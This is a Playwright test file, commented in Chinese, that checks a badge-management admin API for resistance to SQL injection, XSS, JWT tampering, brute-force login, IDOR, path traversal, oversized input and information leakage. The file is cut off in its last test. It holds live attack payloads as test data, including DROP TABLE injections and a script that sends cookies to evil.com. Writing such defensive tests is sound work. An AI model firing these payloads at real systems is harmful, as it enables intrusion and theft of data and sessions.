import { test, expect, APIRequestContext } from '@playwright/test';
import { ApiHelper, testUsers } from '../utils';

const BASE_URL = process.env.BASE_URL || 'http://localhost:3001';

// ============================================================
// 1. SQL 注入防护
// ============================================================
test.describe.serial('安全测试: SQL 注入防护', () => {
  let api: ApiHelper;
  let apiContext: APIRequestContext;
  let adminToken: string;
  const testPrefix = `SEC${Date.now().toString(36)}_`;

  // 记录需要清理的资源 ID
  const createdCategoryIds: number[] = [];

  test.beforeAll(async ({ playwright }) => {
    apiContext = await playwright.request.newContext({ baseURL: BASE_URL });
    api = new ApiHelper(apiContext, BASE_URL);
    adminToken = await api.login(testUsers.admin.username, testUsers.admin.password);
  });

  test.afterAll(async () => {
    // 清理所有测试创建的分类
    for (const id of createdCategoryIds) {
      await api.deleteCategory(id).catch(() => {});
    }
    await api.cleanup(testPrefix);
    await apiContext?.dispose();
  });

  test('POST 分类名含 SQL 注入载荷 - 应被安全存储或拒绝', async () => {
    const sqlPayload = `${testPrefix}test'; DROP TABLE badges;--`;
    const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: { name: sqlPayload, sortOrder: 0 },
    });

    const status = response.status();
    // 安全的行为：要么安全存储（200），要么因校验拒绝（400）
    expect([200, 400]).toContain(status);

    if (status === 200) {
      const body = await response.json();
      const id = body?.data?.id;
      if (id) createdCategoryIds.push(id);
    }
  });

  test('验证 SQL 注入载荷被作为纯文本存储', async () => {
    // 跳过条件：上一步未成功创建
    test.skip(createdCategoryIds.length === 0, '前一用例未成功创建带 SQL 载荷的分类');

    const categories = await api.getCategories({ keyword: testPrefix });
    const items = categories?.data?.items || categories?.data || [];
    const found = items.find((c: any) => c.name?.includes("DROP TABLE"));

    // 如果存在，说明被安全地当作纯文本存储了，而非执行了 SQL
    if (found) {
      expect(found.name).toContain("DROP TABLE");
      expect(found.name).toContain("badges");
    }
  });

  test('GET 分类关键字含 SQL 注入 - 不应返回全部数据', async () => {
    // 先获取不带注入的总数作为基线
    const normalRes = await api.getCategories({ pageSize: 1 });
    const totalNormal = normalRes?.data?.total || 0;

    // 用 OR '1'='1' 尝试注入
    const injectedRes = await apiContext.get(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      params: { keyword: "test' OR '1'='1", pageSize: 100 },
    });

    const status = injectedRes.status();
    if (status === 200) {
      const body = await injectedRes.json();
      const injectedItems = body?.data?.items || body?.data || [];
      // 注入查询不应返回比正常查询更多的数据（若注入成功会返回全部记录）
      // 安全行为：返回 0 条或与 keyword 匹配的少量记录
      expect(injectedItems.length).toBeLessThanOrEqual(totalNormal);
    } else {
      // 400 也是可接受的安全行为
      expect([400, 422]).toContain(status);
    }
  });

  test('GET 徽章排序字段含 SQL 注入 - 应返回 400 或忽略', async () => {
    const response = await apiContext.get(`${BASE_URL}/api/admin/badges`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      params: { sortField: 'name;DROP TABLE badges', current: 1, pageSize: 10 },
    });
    // 安全行为：400 拒绝，或 200 忽略非法排序字段
    expect([200, 400, 422]).toContain(response.status());

    if (response.status() === 200) {
      // 即使返回 200，也要验证服务仍然正常（badges 表未被删除）
      const verifyRes = await api.getBadges({ current: 1, pageSize: 1 });
      expect(verifyRes).toBeTruthy();
    }
  });

  test('GET 徽章分页参数含 SQL 注入 - 应忽略', async () => {
    const response = await apiContext.get(`${BASE_URL}/api/admin/badges`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      params: { current: '1;DROP TABLE badges', pageSize: '10' },
    });
    // 参数类型不匹配应被拒绝或安全处理
    expect([200, 400, 422]).toContain(response.status());
  });

  test('GET 用户路径含 SQL 注入 - 应安全处理', async () => {
    const response = await apiContext.get(`${BASE_URL}/api/admin/users/1 OR 1=1/badges`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
    });
    // URL 中的空格和 SQL 片段被 URL 编码后，框架按普通路径匹配
    // 200（安全处理）、400（参数校验失败）、404（路由不匹配）均为安全行为
    expect([200, 400, 404]).toContain(response.status());
    // 无论哪种状态码，响应不应包含其他用户的敏感数据
    const body = await response.text();
    expect(body.toLowerCase()).not.toContain('password');
    expect(body.toLowerCase()).not.toContain('secret');
  });

  test('POST 批量发放含 SQL 注入的 userIds - 应验证失败', async () => {
    const response = await apiContext.post(`${BASE_URL}/api/admin/grants/batch`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: {
        userIds: ['1; DROP TABLE users'],
        badgeId: 1,
        reason: 'SQL injection test',
      },
    });
    // 非法 userIds 格式应被拒绝或安全处理
    expect([400, 404, 422, 500]).toContain(response.status());
  });

  test('POST 规则条件含 SQL 注入 - 应被安全存储', async () => {
    const response = await apiContext.post(`${BASE_URL}/api/admin/rules`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: {
        badgeId: 1,
        ruleCode: `${testPrefix}sql_inject_rule`,
        eventType: 'purchase',
        name: `${testPrefix}SQL注入规则`,
        ruleJson: {
          type: 'event',
          conditions: [{ field: "amount'; DROP TABLE rules;--", op: 'gte', value: 100 }],
        },
      },
    });

    const status = response.status();
    // 规则创建可能因 badgeId 不存在返回 404，SQL 注入载荷应被原样保存或被拒绝
    expect([200, 400, 404, 422]).toContain(status);

    if (status === 200) {
      const body = await response.json();
      const ruleId = body?.data?.id;
      if (ruleId) {
        await api.deleteRule(ruleId).catch(() => {});
      }
    }
  });
});

// ============================================================
// 2. XSS 防护
// ============================================================
test.describe.serial('安全测试: XSS 防护', () => {
  let api: ApiHelper;
  let apiContext: APIRequestContext;
  let adminToken: string;
  const testPrefix = `SEC${Date.now().toString(36)}_`;

  const createdCategoryIds: number[] = [];

  test.beforeAll(async ({ playwright }) => {
    apiContext = await playwright.request.newContext({ baseURL: BASE_URL });
    api = new ApiHelper(apiContext, BASE_URL);
    adminToken = await api.login(testUsers.admin.username, testUsers.admin.password);
  });

  test.afterAll(async () => {
    for (const id of createdCategoryIds) {
      await api.deleteCategory(id).catch(() => {});
    }
    await api.cleanup(testPrefix);
    await apiContext?.dispose();
  });

  test('分类名含 <script> 标签 - 应作为纯文本存储', async () => {
    const xssPayload = `${testPrefix}<script>alert('xss')</script>`;
    const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: { name: xssPayload, sortOrder: 0 },
    });

    const status = response.status();
    expect([200, 400]).toContain(status);

    if (status === 200) {
      const body = await response.json();
      const id = body?.data?.id;
      if (id) createdCategoryIds.push(id);

      // 回读验证：通过 ID 精确查询，确认 XSS 载荷被原样存储为纯文本
      const categories = await api.getCategories({ keyword: testPrefix });
      const items = categories?.data?.items || categories?.data?.records || categories?.data || [];
      const itemsList = Array.isArray(items) ? items : [];
      const found = itemsList.find((c: any) =>
        c.name?.includes('<script>') || c.name?.includes('&lt;script')
      );
      // 无论是原样存储还是 HTML 转义，都不应执行脚本，两种都是安全的
      // 如果搜索不到（API 可能过滤了特殊字符），也视为安全行为
      if (found) {
        // 存储为原样或转义形式都说明没有执行脚本
        const name = found.name;
        const isRaw = name.includes('<script>');
        const isEscaped = name.includes('&lt;script');
        expect(isRaw || isEscaped).toBeTruthy();
      }
    }
  });

  test('徽章描述含 img onerror XSS - 应作为纯文本存储', async () => {
    const { seriesId } = await api.ensureTestData(testPrefix);
    const xssDescription = '<img src=x onerror=alert(1)>';

    const response = await apiContext.post(`${BASE_URL}/api/admin/badges`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: {
        name: `${testPrefix}XSS徽章`,
        description: xssDescription,
        seriesId,
        badgeType: 'NORMAL',
        assets: { iconUrl: 'https://example.com/badge.png' },
        validityConfig: { validityType: 'PERMANENT' },
      },
    });

    const status = response.status();
    expect([200, 400]).toContain(status);

    if (status === 200) {
      const body = await response.json();
      const badgeId = body?.data?.id;

      // 回读验证
      const badges = await api.getBadges({ keyword: `${testPrefix}XSS徽章` });
      const items = badges?.data?.items || badges?.data || [];
      const found = items.find((b: any) => b.id === badgeId);
      if (found) {
        // 描述中的 XSS 应被原样保存而非转义为 HTML 实体
        expect(found.description).toContain('<img');
        expect(found.description).toContain('onerror');
      }
    }
  });

  test('规则名含 XSS 载荷 - 应作为纯文本存储', async () => {
    const xssName = `${testPrefix}<svg/onload=alert(document.cookie)>`;
    const response = await apiContext.post(`${BASE_URL}/api/admin/rules`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: {
        badgeId: 1,
        ruleCode: `${testPrefix}xss_rule`,
        eventType: 'purchase',
        name: xssName,
        ruleJson: { type: 'event', conditions: [] },
      },
    });

    const status = response.status();
    // 规则创建可能因 badgeId 不存在返回 404，XSS 载荷不影响安全判断
    expect([200, 400, 404, 422]).toContain(status);

    if (status === 200) {
      const body = await response.json();
      const ruleId = body?.data?.id;
      if (ruleId) {
        await api.deleteRule(ruleId).catch(() => {});
      }
    }
  });

  test('系统用户昵称含 SVG XSS - 应作为纯文本存储', async () => {
    const xssNickname = `${testPrefix}<svg onload=alert(1)>`;
    const response = await apiContext.post(`${BASE_URL}/api/admin/system/users`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: {
        username: `${testPrefix}xss_user`,
        password: 'Test@123456',
        displayName: xssNickname,
        email: `${testPrefix}xss@test.com`,
      },
    });

    const status = response.status();
    expect([200, 400, 409]).toContain(status);

    if (status === 200) {
      const body = await response.json();
      const userId = body?.data?.id;
      if (userId) {
        // 回读验证
        const users = await api.getSystemUsers();
        const items = users?.data?.items || users?.data || [];
        const found = items.find((u: any) => u.id === userId);
        if (found) {
          const displayName = found.display_name || found.displayName || '';
          expect(displayName).toContain('<svg');
        }
        // 清理
        await api.deleteSystemUser(userId).catch(() => {});
      }
    }
  });

  test('权益名称含 XSS 载荷 - 应作为纯文本存储', async () => {
    const xssBenefitName = `${testPrefix}<iframe src="javascript:alert(1)">`;
    const response = await apiContext.post(`${BASE_URL}/api/admin/benefits`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: {
        name: xssBenefitName,
        code: `${testPrefix}xss_ben`,
        type: 'COUPON',
        benefitType: 'COUPON',
        value: 10,
        externalId: `${testPrefix}xss_ext`,
        description: '测试权益 XSS 防护',
        validityDays: 30,
      },
    });

    const status = response.status();
    expect([200, 400]).toContain(status);

    if (status === 200) {
      const body = await response.json();
      const benefitId = body?.data?.id;
      if (benefitId) {
        await api.deleteBenefit(benefitId).catch(() => {});
      }
    }
  });

  test('存储型 XSS: 创建后回读 JSON 响应中不含可执行脚本', async () => {
    const xssPayload = `${testPrefix}<script>document.location='http://evil.com?c='+document.cookie</script>`;
    let categoryId: number | undefined;

    try {
      const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${adminToken}`,
        },
        data: { name: xssPayload, sortOrder: 0 },
      });

      if (response.status() === 200) {
        const body = await response.json();
        categoryId = body?.data?.id;

        // 通过 GET 接口回读
        const getResponse = await apiContext.get(`${BASE_URL}/api/admin/categories`, {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${adminToken}`,
          },
          params: { keyword: testPrefix },
        });

        const contentType = getResponse.headers()['content-type'] || '';
        // API 响应必须是 JSON 格式而非 HTML，确保浏览器不会将其作为 HTML 解析执行
        expect(contentType).toContain('application/json');

        const getText = await getResponse.text();
        // JSON 响应中 <script> 会被 JSON 序列化转义，不会被浏览器执行
        // 确保响应体不是裸 HTML
        expect(getText.startsWith('<')).toBeFalsy();
      }
    } finally {
      if (categoryId) {
        await api.deleteCategory(categoryId).catch(() => {});
      }
    }
  });
});

// ============================================================
// 3. 认证安全
// ============================================================
test.describe('安全测试: 认证安全', () => {
  let apiContext: APIRequestContext;
  let adminApi: ApiHelper;
  let adminToken: string;
  let bruteTestUserId: number | null = null;
  const BRUTE_USER = `brute_${Date.now().toString(36)}`;
  const BRUTE_PASS = 'BruteTest123!';

  test.beforeAll(async ({ playwright }) => {
    apiContext = await playwright.request.newContext({ baseURL: BASE_URL });
    // 预先获取 admin token，用于创建/清理暴力测试专用用户
    adminApi = new ApiHelper(apiContext, BASE_URL);
    adminToken = await adminApi.login(testUsers.admin.username, testUsers.admin.password);

    // 创建暴力破解测试专用用户，避免锁定 admin 账户
    try {
      const resp = await apiContext.post(`${BASE_URL}/api/admin/system/users`, {
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${adminToken}`,
        },
        data: { username: BRUTE_USER, password: BRUTE_PASS, role_id: 3, display_name: 'Brute Test' },
      });
      if (resp.ok()) {
        const body = await resp.json();
        bruteTestUserId = body.data?.id ?? null;
      }
    } catch {
      // 创建失败不阻塞测试
    }
  });

  test.afterAll(async () => {
    // 清理：如果暴力测试用户被锁定，重置其密码以解锁
    if (bruteTestUserId) {
      await apiContext.post(`${BASE_URL}/api/admin/system/users/${bruteTestUserId}/reset-password`, {
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${adminToken}`,
        },
        data: { new_password: BRUTE_PASS },
      }).catch(() => {});
    }
    await apiContext?.dispose();
  });

  test('无 Authorization 头访问受保护接口 - 应返回 401', async () => {
    const response = await apiContext.get(`${BASE_URL}/api/admin/badges`, {
      headers: { 'Content-Type': 'application/json' },
    });
    expect(response.status()).toBe(401);
  });

  test('携带过期/无效 JWT 访问 - 应返回 401', async () => {
    const response = await apiContext.get(`${BASE_URL}/api/admin/badges`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: 'Bearer invalid.token.here',
      },
    });
    expect(response.status()).toBe(401);
  });

  test('篡改 JWT payload 段 - 应返回 401', async () => {
    // 先获取一个有效 token
    const api = new ApiHelper(apiContext, BASE_URL);
    const validToken = await api.login(testUsers.admin.username, testUsers.admin.password);

    // 篡改 JWT 的 payload 段（中间部分），使签名校验失败
    const parts = validToken.split('.');
    if (parts.length === 3) {
      // 将 payload 中的内容替换为伪造的 admin 声明
      const fakePayload = Buffer.from(
        JSON.stringify({ sub: '9999', username: 'hacker', role: 'admin', exp: 9999999999 })
      ).toString('base64url');
      const tamperedToken = `${parts[0]}.${fakePayload}.${parts[2]}`;

      const response = await apiContext.get(`${BASE_URL}/api/admin/badges`, {
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${tamperedToken}`,
        },
      });
      expect(response.status()).toBe(401);
    }
  });

  test('错误密码登录 - 应返回 401 或错误响应', async () => {
    const response = await apiContext.post(`${BASE_URL}/api/admin/auth/login`, {
      headers: { 'Content-Type': 'application/json' },
      data: { username: 'admin', password: 'wrong_password_12345' },
    });
    // 错误密码不应返回 200
    expect(response.status()).not.toBe(200);
    expect([400, 401, 403]).toContain(response.status());
  });

  test('登录用户名含 SQL 注入 - 应返回 401 且不泄露信息', async () => {
    const response = await apiContext.post(`${BASE_URL}/api/admin/auth/login`, {
      headers: { 'Content-Type': 'application/json' },
      data: { username: "admin'--", password: 'admin123' },
    });
    expect(response.status()).not.toBe(200);

    const body = await response.text();
    // 错误信息不应包含 SQL 语法细节
    expect(body.toLowerCase()).not.toContain('syntax');
    expect(body.toLowerCase()).not.toContain('sql');
    expect(body.toLowerCase()).not.toContain('query');
  });

  test('连续 10 次失败登录 - 服务应保持稳定且触发锁定', async () => {
    // 使用专用暴力测试用户，避免锁定 admin 账户导致后续测试失败
    const targetUser = bruteTestUserId ? BRUTE_USER : `nonexistent_${Date.now()}`;
    const results: number[] = [];

    for (let i = 0; i < 10; i++) {
      const response = await apiContext.post(`${BASE_URL}/api/admin/auth/login`, {
        headers: { 'Content-Type': 'application/json' },
        data: { username: targetUser, password: `wrong_pass_${i}` },
      });
      results.push(response.status());
    }

    // 所有请求都应返回认证失败，服务不应崩溃（不能出现 500/502/503）
    for (const status of results) {
      expect([400, 401, 403, 429]).toContain(status);
    }

    // 如果有专用测试用户，验证锁定机制已触发（第 5 次之后应返回 403）
    if (bruteTestUserId) {
      const lockedResults = results.slice(5);
      const hasLock = lockedResults.some((s) => s === 403);
      expect(hasLock).toBeTruthy();
    }

    // admin 账户不受影响，仍可正常登录
    const normalLogin = await apiContext.post(`${BASE_URL}/api/admin/auth/login`, {
      headers: { 'Content-Type': 'application/json' },
      data: { username: testUsers.admin.username, password: testUsers.admin.password },
    });
    expect(normalLogin.status()).toBe(200);
  });
});

// ============================================================
// 4. IDOR 越权访问
// ============================================================
test.describe('安全测试: IDOR 越权访问', () => {
  let adminApi: ApiHelper;
  let viewerApi: ApiHelper;
  let operatorApi: ApiHelper;
  let adminContext: APIRequestContext;
  let viewerContext: APIRequestContext;
  let operatorContext: APIRequestContext;
  let viewerToken: string;
  let operatorToken: string;

  test.beforeAll(async ({ playwright }) => {
    adminContext = await playwright.request.newContext({ baseURL: BASE_URL });
    viewerContext = await playwright.request.newContext({ baseURL: BASE_URL });
    operatorContext = await playwright.request.newContext({ baseURL: BASE_URL });

    adminApi = new ApiHelper(adminContext, BASE_URL);
    viewerApi = new ApiHelper(viewerContext, BASE_URL);
    operatorApi = new ApiHelper(operatorContext, BASE_URL);

    await adminApi.login(testUsers.admin.username, testUsers.admin.password);

    // 确保低权限用户存在
    await adminApi.ensureUser('viewer', testUsers.viewer.password, 3);
    await adminApi.ensureUser('operator', testUsers.operator.password, 2);

    viewerToken = await viewerApi.login(testUsers.viewer.username, testUsers.viewer.password);
    operatorToken = await operatorApi.login(testUsers.operator.username, testUsers.operator.password);
  });

  test.afterAll(async () => {
    await adminContext?.dispose();
    await viewerContext?.dispose();
    await operatorContext?.dispose();
  });

  test('viewer 尝试创建分类 - 应返回 403', async () => {
    const response = await viewerContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${viewerToken}`,
      },
      data: { name: 'IDOR测试分类', sortOrder: 0 },
    });
    expect(response.status()).toBe(403);
  });

  test('请求不存在的资源 - 应返回 404', async () => {
    const adminToken = (adminApi as any).token;
    const response = await adminContext.get(`${BASE_URL}/api/admin/badges/999999`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
    });
    // 不存在的资源应返回 404，不应返回其他用户的数据
    expect([400, 404]).toContain(response.status());
  });

  test('路径遍历攻击 - 不应泄露系统文件', async () => {
    const adminToken = (adminApi as any).token;
    // HTTP 客户端会自动规范化 ../ 路径段，所以也测试编码形式
    const paths = [
      `${BASE_URL}/api/admin/badges/../../../etc/passwd`,
      `${BASE_URL}/api/admin/badges/%2e%2e/%2e%2e/%2e%2e/etc/passwd`,
    ];

    for (const path of paths) {
      const response = await adminContext.get(path, {
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${adminToken}`,
        },
      });
      // 框架规范化 ../ 后可能匹配到正常路由返回 200，这是安全行为
      // 关键验证：响应体不应包含系统文件内容
      const body = await response.text();
      expect(body).not.toContain('root:');
      expect(body).not.toContain('/bin/bash');
      expect(body).not.toContain('/etc/passwd');
    }
  });

  test('operator 尝试创建系统用户 - 应返回 403', async () => {
    const response = await operatorContext.post(`${BASE_URL}/api/admin/system/users`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${operatorToken}`,
      },
      data: {
        username: 'idor_hack_user',
        password: 'Test@123456',
        nickname: '越权创建',
        email: 'idor@test.com',
      },
    });
    expect(response.status()).toBe(403);
  });

  test('viewer 尝试删除徽章 - 应返回 403', async () => {
    const response = await viewerContext.delete(`${BASE_URL}/api/admin/badges/1`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${viewerToken}`,
      },
    });
    // viewer 没有写权限，应被拒绝
    expect(response.status()).toBe(403);
  });
});

// ============================================================
// 5. 输入边界验证
// ============================================================
test.describe('安全测试: 输入边界验证', () => {
  let api: ApiHelper;
  let apiContext: APIRequestContext;
  let adminToken: string;
  const testPrefix = `SEC${Date.now().toString(36)}_`;

  test.beforeAll(async ({ playwright }) => {
    apiContext = await playwright.request.newContext({ baseURL: BASE_URL });
    api = new ApiHelper(apiContext, BASE_URL);
    adminToken = await api.login(testUsers.admin.username, testUsers.admin.password);
  });

  test.afterAll(async () => {
    await api.cleanup(testPrefix);
    await apiContext?.dispose();
  });

  test('超长分类名（10000 字符）- 应返回 400 或截断', async () => {
    const longName = `${testPrefix}${'A'.repeat(10000)}`;
    const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: { name: longName, sortOrder: 0 },
    });

    const status = response.status();
    if (status === 200) {
      // 如果服务端接受了，验证名称被截断处理
      const body = await response.json();
      const id = body?.data?.id;
      if (id) {
        const categories = await api.getCategories({ keyword: testPrefix });
        const items = categories?.data?.items || categories?.data || [];
        const found = items.find((c: any) => c.id === id);
        // 存储的名称长度应小于原始长度（被截断）或等于（全部存储）
        expect(found).toBeTruthy();
        await api.deleteCategory(id).catch(() => {});
      }
    } else {
      // 400/422 表示服务端正确拒绝了超长输入
      expect([400, 413, 422]).toContain(status);
    }
  });

  test('Unicode 和 Emoji 分类名 - 应正常处理', async () => {
    const unicodeName = `${testPrefix}🏆徽章テスト\u200B`;
    const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: { name: unicodeName, sortOrder: 0 },
    });

    // Unicode 和 Emoji 是合法输入，应被正常接受
    expect(response.status()).toBe(200);

    const body = await response.json();
    const id = body?.data?.id;
    if (id) {
      // 验证 Unicode 字符被正确存储和返回
      const categories = await api.getCategories({ keyword: testPrefix });
      const items = categories?.data?.items || categories?.data || [];
      const found = items.find((c: any) => c.id === id);
      if (found) {
        expect(found.name).toContain('🏆');
        expect(found.name).toContain('テスト');
      }
      await api.deleteCategory(id).catch(() => {});
    }
  });

  test('空名称分类 - 应返回 400', async () => {
    const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: { name: '', sortOrder: 0 },
    });
    // 空字符串不应被接受
    expect([400, 422]).toContain(response.status());
  });

  test('负数页码 - 应返回 400 或使用默认值', async () => {
    const response = await apiContext.get(`${BASE_URL}/api/admin/badges`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      params: { current: -1, pageSize: 10 },
    });

    const status = response.status();
    if (status === 200) {
      // 如果服务端接受了负数，应该回退到默认第 1 页
      const body = await response.json();
      const items = body?.data?.items || body?.data || [];
      // 至少不应导致服务端异常
      expect(Array.isArray(items)).toBeTruthy();
    } else {
      expect([400, 422]).toContain(status);
    }
  });

  test('深层嵌套 JSON（100 层）- 应返回 400 或 413', async () => {
    // 构造 100 层嵌套的 JSON 对象
    let nested: any = { value: 'deep' };
    for (let i = 0; i < 100; i++) {
      nested = { child: nested };
    }

    const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: { name: `${testPrefix}deep_nested`, sortOrder: 0, extra: nested },
    });

    // 深层嵌套应被拒绝或安全处理（多余字段被忽略）
    expect([200, 400, 413, 422]).toContain(response.status());

    if (response.status() === 200) {
      const body = await response.json();
      if (body?.data?.id) {
        await api.deleteCategory(body.data.id).catch(() => {});
      }
    }
  });

  test('超大请求体（2MB）- 应返回 400 或 413', async () => {
    // 2MB 的 'a' 字符
    const largeBody = 'a'.repeat(2 * 1024 * 1024);

    const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      data: { name: largeBody, sortOrder: 0 },
    });

    // 超大请求应被 Web 框架层面的 body size limit 拒绝
    expect([400, 413, 422]).toContain(response.status());
  });
});

// ============================================================
// 6. CSRF 防护
// ============================================================
test.describe('安全测试: CSRF 防护', () => {
  let apiContext: APIRequestContext;
  let adminToken: string;

  test.beforeAll(async ({ playwright }) => {
    apiContext = await playwright.request.newContext({ baseURL: BASE_URL });
    const api = new ApiHelper(apiContext, BASE_URL);
    adminToken = await api.login(testUsers.admin.username, testUsers.admin.password);
  });

  test.afterAll(async () => {
    await apiContext?.dispose();
  });

  test('携带恶意 Origin 头的请求 - 应被 CORS 策略拒绝或忽略', async () => {
    const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
        Origin: 'http://evil.com',
      },
      data: { name: 'CSRF测试', sortOrder: 0 },
    });

    const status = response.status();
    if (status === 200) {
      // 如果后端不校验 Origin（API 场景常见），至少确认数据已创建需清理
      const body = await response.json();
      if (body?.data?.id) {
        // 服务端可能不拦截 Origin 但依赖 JWT 进行身份验证，这也是安全的
        const api = new ApiHelper(apiContext, BASE_URL);
        api.setToken(adminToken);
        await api.deleteCategory(body.data.id).catch(() => {});
      }
    } else {
      // 403 表示 CORS 策略起作用
      expect([403]).toContain(status);
    }
  });

  test('不携带 Origin 头的 API 请求 - 应正常工作', async () => {
    // 无 Origin 头但有有效 JWT 的请求应被允许（服务间调用场景）
    const response = await apiContext.get(`${BASE_URL}/api/admin/badges`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      // 不发送 Origin 头
    });
    expect(response.status()).toBe(200);
  });

  test('CORS 响应头检查 - Access-Control-Allow-Origin 不应为 *', async () => {
    // 发送 OPTIONS 预检请求
    const response = await apiContext.fetch(`${BASE_URL}/api/admin/badges`, {
      method: 'OPTIONS',
      headers: {
        Origin: 'http://localhost:3000',
        'Access-Control-Request-Method': 'GET',
        'Access-Control-Request-Headers': 'Authorization',
      },
    });

    const corsOrigin = response.headers()['access-control-allow-origin'];
    if (corsOrigin) {
      // 生产环境不应设置为 *（允许所有来源）
      // 开发环境允许 * 但需要注意风险
      // 此处仅验证 CORS 头存在且格式正确
      expect(typeof corsOrigin).toBe('string');
    }

    // 验证不允许携带凭证的通配符 CORS
    const corsCredentials = response.headers()['access-control-allow-credentials'];
    if (corsOrigin === '*' && corsCredentials === 'true') {
      // 这是不安全的组合：允许所有来源 + 允许携带凭证
      expect(corsOrigin).not.toBe('*');
    }
  });
});

// ============================================================
// 7. 信息泄露防护
// ============================================================
test.describe('安全测试: 信息泄露防护', () => {
  let apiContext: APIRequestContext;
  let adminToken: string;

  test.beforeAll(async ({ playwright }) => {
    apiContext = await playwright.request.newContext({ baseURL: BASE_URL });
    const api = new ApiHelper(apiContext, BASE_URL);
    adminToken = await api.login(testUsers.admin.username, testUsers.admin.password);
  });

  test.afterAll(async () => {
    await apiContext?.dispose();
  });

  test('请求不存在的路由 - 响应不应包含堆栈跟踪或源码路径', async () => {
    const response = await apiContext.get(`${BASE_URL}/api/admin/nonexistent`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
    });

    const body = await response.text();
    // 404 响应不应泄露服务器内部信息
    expect(body).not.toContain('at ');              // 堆栈跟踪格式
    expect(body).not.toContain('.rs:');              // Rust 源码路径
    expect(body).not.toContain('panicked');          // Rust panic 信息
    expect(body).not.toContain('RUST_BACKTRACE');    // Rust 调试环境变量
    expect(body).not.toContain('node_modules');      // Node.js 路径
    expect(body.toLowerCase()).not.toContain('stack trace');
  });

  test('发送非法 JSON 到分类接口 - 错误不应包含 SQL 语句', async () => {
    const response = await apiContext.post(`${BASE_URL}/api/admin/categories`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
      // 发送格式正确但字段类型错误的 JSON（sortOrder 应为数字）
      data: 'this is not json',
    });

    const body = await response.text();
    // 错误消息不应暴露数据库查询语句
    expect(body.toUpperCase()).not.toContain('SELECT ');
    expect(body.toUpperCase()).not.toContain('INSERT INTO');
    expect(body.toUpperCase()).not.toContain('UPDATE ');
    expect(body.toUpperCase()).not.toContain('DELETE FROM');
    // 检查数据库表/列名引用，排除 JSON 解析位置信息中的 "column N"
    expect(body.toLowerCase()).not.toMatch(/table\s+[a-z_]+/);
    expect(body.toLowerCase()).not.toMatch(/column\s+[a-z_"]+/);  // "column 18" 等数字位置是安全的
  });

  test('GET 非法 ID 格式 - 错误不应包含数据库细节', async () => {
    const response = await apiContext.get(`${BASE_URL}/api/admin/badges/abc`, {
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${adminToken}`,
      },
    });

    const body = await response.text();
    // 非法 ID 的错误响应不应泄露数据库类型或表结构
    expect(body.toLowerCase()).not.toContain('postgresql');
    expect(body.toLowerCase()).not.toContain('mysql');
    expect(body.toLowerCase()).not.toContain('sqlstate');
    expect(body.toLowerCase()).not.toContain('pg_');
    expect(body.toLowerCase()).not.toContain('relation');
  });

  test('不存在的用户登录 vs 密码错误 - 错误信息应一致', async () => {
    // 不存在的用户名
    const nonExistentRes = await apiContext.post(`${BASE_URL}/api/admin/auth/login`, {
      headers: { 'Content-Type': 'application/json' },
      data: { username: 'nonexistent_user_xyz_12345', password: 'any_password' },
    });
    const nonExistentBody = await nonExistentRes.text();
    const nonExistentStatus = nonExistentRes.status();

    // 存在的用户名 + 错误密码
    const wrongPassRes = await apiContext.post(`${BASE_URL}/api/admin/auth/login`, {
      headers: { 'Content-Type': 'application/json' },
